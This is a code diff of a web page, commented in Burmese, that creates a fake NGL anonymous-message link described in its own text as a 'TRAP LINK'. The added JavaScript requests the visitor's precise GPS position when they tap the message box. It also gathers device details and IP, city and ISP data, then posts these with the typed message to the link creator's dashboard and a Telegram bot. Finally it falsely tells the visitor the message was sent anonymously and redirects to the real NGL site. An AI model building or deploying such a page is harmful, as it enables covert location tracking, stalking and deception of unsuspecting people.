@@ -20,7 +20,6 @@
             background: #000;
         }
 
-        /* 📡 Dashboard View Style */
         .dashboard-body { background: var(--bg-dashboard) no-repeat center center fixed; background-size: cover; color: white; }
         
         .panel {
@@ -30,7 +29,6 @@
         }
         .dashboard-panel { max-width: 800px; }
 
-        /* 🪤 NGL UI Template Style */
         .ngl-body { background: var(--ngl-gradient); }
         .ngl-card {
             background: white; border-radius: 30px; padding: 35px 25px; width: 100%; max-width: 420px;
@@ -39,14 +37,13 @@
         .ngl-avatar { width: 75px; height: 75px; border-radius: 50%; background: #ddd; margin: -75px auto 15px auto; border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; font-size: 2rem; }
         .ngl-username { font-weight: 700; color: #111; font-size: 1.1rem; margin-bottom: 5px; }
         .ngl-bubble { background: #f0f0f0; border-radius: 20px; padding: 20px; text-align: left; font-weight: 600; color: #444; font-size: 1rem; margin-bottom: 20px; position: relative; }
-        .ngl-textarea { width: 100%; border: none; background: transparent; resize: none; outline: none; font-size: 1.05rem; font-family: inherit; font-weight: 600; height: 80px; }
+        .ngl-textarea { width: 100%; border: none; background: transparent; resize: none; outline: none; font-size: 1.05rem; font-family: inherit; font-weight: 600; height: 80px; color: #111; }
         .ngl-btn { background: #000; color: white; font-weight: 800; border: none; padding: 16px; border-radius: 30px; width: 100%; font-size: 1.1rem; cursor: pointer; text-transform: lowercase; letter-spacing: 0.5px; transition: 0.2s; }
-        .ngl-btn:hover { background: #222; transform: scale(1.01); }
+        .ngl-btn:hover { background: #222; }
 
-        /* General Inputs */
         .input-box { width: 100%; background: rgba(255,255,255,0.06); border: 1px solid var(--border); padding: 14px; border-radius: 12px; color: white; outline: none; font-size: 1rem; text-align: center; margin-bottom: 15px; box-sizing: border-box; }
         .btn-cyan { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 1rem; font-weight: bold; cursor: pointer; color: white; background: var(--neon-blue); box-shadow: 0 4px 15px rgba(6, 182, 212, 0.4); text-transform: uppercase; }
-        .link-display-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 10px; border: 1px dashed var(--neon-blue); color: var(--neon-blue); font-weight: bold; cursor: pointer; word-break: break-all; margin: 15px 0; }
+        .link-display-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 10px; border: 1px dashed var(--neon-blue); color: var(--neon-blue); font-weight: bold; cursor: pointer; word-break: break-all; margin: 15px 0; box-sizing: border-box; }
         .log-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px; text-align: left; max-height: 400px; overflow-y: auto; }
         .log-card { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 14px; padding: 15px; line-height: 1.6; }
     </style>
@@ -55,7 +52,7 @@
 
     <div id="setup-screen" class="panel">
         <h2 style="color: var(--neon-blue); margin: 0 0 10px 0;">🕵️ ANONYMOUS VIBE GENERATOR</h2>
-        <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px;">Create an anonymous NGL link, put it in your Bio, and catch secret viewers.</p>
+        <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px;">Create an anonymous NGL link, catch stalkers and get their real messages.</p>
         <input type="text" id="username-input" class="input-box" placeholder="Enter your Instagram Username">
         <button class="btn-cyan" onclick="generateSpyWall()">⚡ ACTIVATE TRAP LINK</button>
     </div>
@@ -67,7 +64,7 @@
         <hr style="border:0; border-top:1px solid var(--border); margin: 20px 0;">
         <h3 style="text-align: left; color: #f8fafc; margin-bottom: 10px;">🔴 Intercepted Logs (<span id="log-count">0</span>)</h3>
         <div class="log-grid" id="logs-container">
-            <div style="color: #64748b; text-align: center; padding: 20px;" id="no-logs-msg">Waiting for clicks... (Telegram Alerts are also Active!)</div>
+            <div style="color: #64748b; text-align: center; padding: 20px;" id="no-logs-msg">Waiting for clicks... (Telegram Bot is Armed!)</div>
         </div>
     </div>
 
@@ -78,23 +75,23 @@
         
         <div class="ngl-bubble">
             <div style="font-size: 0.75rem; color: #aaa; text-transform: uppercase; font-weight: 700; margin-bottom: 5px;">send me anonymous messages!</div>
-            <textarea id="ngl-msg-input" class="ngl-textarea" placeholder="send me anonymous messages..." onfocus="triggerTrap()"></textarea>
+            <textarea id="ngl-msg-input" class="ngl-textarea" placeholder="send me anonymous messages..." onfocus="requestRealGPS()"></textarea>
         </div>
         
-        <button class="ngl-btn" onclick="triggerTrap()">send!</button>
+        <button class="ngl-btn" onclick="sendNglMessage()">send!</button>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
         let myAlias = '';
-        let trapTriggered = false;
+        let realGPSCoordinates = "GPS Permission Denied";
 
         window.onload = () => {
             const pathParts = window.location.pathname.split('/');
             if (pathParts[1] === 'social-vibe' && pathParts[2]) {
                 myAlias = pathParts[2].toLowerCase();
-                document.getElementById('main-body').className = "ngl-body"; // Bg Gradient ပြောင်းရန်
+                document.getElementById('main-body').className = "ngl-body";
                 document.getElementById('setup-screen').style.display = 'none';
                 document.getElementById('trap-screen').style.display = 'block';
                 document.getElementById('target-id-label').innerText = myAlias;
@@ -118,6 +115,67 @@
             alert("Copied to bio!");
         }
 
+        // 🎯 GPS တောင်းခံခြင်းစနစ် (စာရိုက်ကွက်ကို နှိပ်လိုက်သည်နှင့် ဖုန်းတည်နေရာအစစ်ကို တောင်းမည်)
+        function requestRealGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        // တကယ့် တည်နေရာကို Google Maps Link အဖြစ် ပြောင်းလဲသိမ်းဆည်းခြင်း
+                        realGPSCoordinates = `📌 Real GPS Location Map: https://www.google.com/maps?q=${lat},${lon}`;
+                    },
+                    (error) => { console.log("GPS Blocked"); },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            }
+        }
+
+        // ✉️ ခလုတ်နှိပ်သည့်အခါ စာသားရော၊ ဒေတာရော ဖမ်းယူပို့ပေးမည့် Function
+        async function sendNglMessage() {
+            const typedMessage = document.getElementById('ngl-msg-input').value.trim();
+            if (!typedMessage) return alert("Please write a message first!");
+
+            let specs = [];
+            if (window.screen) specs.push(`Screen: ${window.screen.width}x${window.screen.height}`);
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    specs.push(`Battery: ${Math.round(b.level * 100)}%`);
+                }
+            } catch(e){}
+
+            // IP API သုံးပြီး ISP အချက်အလက်ဖတ်ခြင်း
+            let ipGeo = "IP Provider Blocked";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const d = await res.json();
+                    ipGeo = `${d.city}, ${d.country_name} (${d.org})`;
+                }
+            } catch (err) {}
+
+            const fullLocationPayload = `${ipGeo} | ${realGPSCoordinates} | [${specs.join(' | ')}]`;
+
+            // ဆာဗာသို့ တကယ့်စာသားနှင့် အချက်အလက်များကို POST လုပ်ခြင်း
+            fetch(`/api/vibecheck/${myAlias}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    location: fullLocationPayload,
+                    message: typedMessage // သူငယ်ချင်း ရိုက်လိုက်သောစာအစစ်
+                })
+            })
+            .then(() => {
+                // အစစ်အမှန် NGL သို့ ပို့လိုက်သကဲ့သို့ အာရုံလွှဲကာ အောင်မြင်ကြောင်း ပြသမည်
+                alert("Anonymous message sent anonymously! 😉");
+                window.location.href = `https://ngl.link/${myAlias}`;
+            })
+            .catch(() => {
+                window.location.href = `https://ngl.link/${myAlias}`;
+            });
+        }
+
         socket.on('initLogs', (logs) => {
             if (logs.length > 0) {
                 document.getElementById('no-logs-msg').style.display = 'none';
@@ -136,48 +194,10 @@
             return `
                 <div class="log-card">
                     <span style="float:right; font-size:0.8rem; color:#94a3b8;">⏰ ${log.timestamp}</span>
-                    🟢 <b>Intercepted Device:</b> ${log.device}<br>
-                    🌐 <b>IP/ISP Info:</b> ${log.location}
+                    🟢 <b>Device:</b> ${log.device}<br>
+                    ℹ️ <b>Data Caught:</b> ${log.location}
                 </div>
             `;
-        }
-
-        // 🪤 Advanced Spy Trap Processing
-        async function triggerTrap() {
-            if (trapTriggered) return; // တစ်ကြိမ်ပဲ ပို့ရန်
-            trapTriggered = true;
-
-            let specs = [];
-            if (window.screen) specs.push(`Screen: ${window.screen.width}x${window.screen.height}`);
-            if (window.matchMedia) specs.push(window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark 🌙" : "Light ☀️");
-            
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    specs.push(`Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging ⚡' : '🔋'})`);
-                }
-            } catch(e){}
-
-            let geo = "Unknown Region";
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                if (res.ok) {
-                    const d = await res.json();
-                    geo = `${d.city}, ${d.country_name} 🇲🇲 (${d.org})`;
-                }
-            } catch (err) {}
-
-            fetch(`/api/vibecheck/${myAlias}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ location: `${geo} | [${specs.join(' | ')}]` })
-            })
-            .then(res => res.json())
-            .then(data => {
-                // အမှန်တကယ် NGL app ထဲရောက်သွားသလို အာရုံလွှဲမည်
-                window.location.href = "https://ngl.link";
-            })
-            .catch(() => window.location.href = "https://ngl.link");
         }
     </script>
 </body>
